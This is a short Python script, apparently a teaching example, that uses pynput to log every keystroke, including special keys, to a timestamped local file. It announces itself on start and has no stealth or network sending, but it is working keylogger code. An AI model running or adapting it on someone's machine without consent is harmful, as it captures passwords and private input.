from pynput import keyboard
import logging
from datetime import datetime

# Set up logging
log_dir = "logs"
filename = f"{log_dir}/keylog_{datetime.now().strftime('%Y-%m-%d_%H-%M-%S')}.txt"

logging.basicConfig(
    filename=filename,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s',
)

def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key: {key}")

def main():
    print("Starting keylogger (educational use only)...")
    print(f"Logging to: {filename}")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
